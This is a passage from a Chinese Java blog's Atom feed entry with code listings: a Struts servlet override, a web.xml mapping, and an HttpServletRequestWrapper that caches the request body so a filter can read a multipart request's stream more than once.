class="line"><span class="tag">&lt;/<span class="name">controller</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.testweb.common.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts.Globals;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts.action.ActionServlet;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts.config.ModuleConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts.util.ModuleUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZActionServlet</span> <span class="keyword">extends</span> <span class="title">ActionServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6096137956303373911L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        YZMultipartRequestWrapper wrapper = <span class="keyword">null</span>;</span><br><span class="line">         wrapper = <span class="keyword">new</span> YZMultipartRequestWrapper(request);</span><br><span class="line">        ModuleUtils.getInstance().selectModule(request, getServletContext());</span><br><span class="line">        ModuleConfig config = getModuleConfig(request);</span><br><span class="line"></span><br><span class="line">        YZDelegatingRequestProcessor processor = getProcessorForModule(config);</span><br><span class="line">        <span class="keyword">if</span> (processor == <span class="keyword">null</span>) &#123;</span><br><span class="line">           processor = (YZDelegatingRequestProcessor) getRequestProcessor(config);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        processor.process(wrapper, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> YZDelegatingRequestProcessor <span class="title">getProcessorForModule</span><span class="params">(ModuleConfig config)</span> </span>&#123;</span><br><span class="line">        String key = Globals.REQUEST_PROCESSOR_KEY + config.getPrefix();</span><br><span class="line">        <span class="keyword">return</span> (YZDelegatingRequestProcessor) getServletContext().getAttribute(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在web.xml中将对应struts的action换成自己实现的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>action<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.yz.testweb.common.web.YZActionServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 其他配置略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他配置略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面发现一个参考链接后<br><a href="https://my.oschina.net/vernon/blog/363693">解决在Filter中读取Request中的流后, 然后再Control中读取不到的做法</a>根本不用这么麻烦。直接只要实现个Wrapper类就好了。所以有了最后的版本。</p><h2 id="使用继承自HttpServletRequestWrapper的Wrapper类，较通用"><a href="#使用继承自HttpServletRequestWrapper的Wrapper类，较通用" class="headerlink" title="使用继承自HttpServletRequestWrapper的Wrapper类，较通用"></a>使用继承自HttpServletRequestWrapper的Wrapper类，较通用</h2><p>因为项目中使用了apache的commoms-io.jar，所以直接使用了其中的IOUtils，可用其他方案替代复制流操作。代码仅作参考。java版本，servlet版本不同，实现的ServletInputStream，方法可能会有不同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.testweb.common.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZMultipartRequestWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream cacheBytes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YZMultipartRequestWrapper</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);</span><br><span class="line">        cacheBytes = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        IOUtils.copy(<span class="keyword">super</span>.getInputStream(), cacheBytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletInputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CacheServletInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheServletInputStream</span> <span class="keyword">extends</span> <span class="title">ServletInputStream</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> ByteArrayInputStream bais;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">CacheServletInputStream</span><span class="params">()</span></span>&#123;</span><br><span class="line">            bais = <span class="keyword">new</span> ByteArrayInputStream(cacheBytes.toByteArray());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> bais.read();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.close();</span><br><span class="line">            bais.close();</span><br><span class="line">            cacheBytes.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BufferedReader <span class="title">getReader</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(getInputStream(),<span class="string">"UTF-8"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filter类中使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//判断为multipartRequest后使用</span></span><br><span class="line">    <span class="keyword">if</span>(req != <span class="keyword">null</span> &amp;&amp; req.getContentType() != <span class="keyword">null</span> &amp;&amp; req.getContentType().indexOf(<span class="string">"multipart/form-data"</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">    YZMultipartRequestWrapper reqWrapper = <span class="keyword">new</span> YZMultipartRequestWrapper(request);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    //中间进行其他操作-1.使用spring中的MultipartResolver</span></span><br><span class="line"><span class="comment">    MultipartResolver resolver = new CommonsMultipartResolver(wrapper.getSession().getServletContext());</span></span><br><span class="line"><span class="comment">    MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(wrapper);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    //中间进行其他操作-2.使用apache的commons.fileupload.jar</span></span><br><span class="line"><span class="comment">    DiskFileItemFactory factory = new DiskFileItemFactory();</span></span><br><span class="line"><span class="comment">    factory.setSizeThreshold(1024*1024*2); // 2M</span></span><br><span class="line"><span class="comment">    ServletFileUpload f = new ServletFileUpload(factory);</span></span><br><span class="line"><span class="comment">    List&lt;FileItem&gt; list = f.parseRequest(req);        </span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    //其他取值校验操作等</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line"></span><br><span class="line">    filterChain.doFilter(reqWrapper,response);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    filterChain.doFilter(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      解决filter中读取request中的inputStream后，不能再次获取流进行操作的问题。使用wrapper，例如一个自建类继承HttpServletRequestWrapper。
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
      <category term="stream" scheme="https://blog.yanzhe.tk/tags/stream/"/>
    
  </entry>
  
</feed>
